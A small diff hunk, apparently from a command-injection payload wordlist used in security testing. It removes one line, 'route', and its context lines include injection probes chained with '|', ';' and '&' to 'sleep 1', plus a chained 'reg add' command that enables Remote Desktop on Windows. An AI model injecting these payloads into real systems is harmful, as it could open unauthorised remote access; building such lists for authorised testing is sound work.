@@ -257,7 +257,6 @@ pwd
 && reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 \r\n
-route
 | sleep 1
 ; sleep 1
 & sleep 1
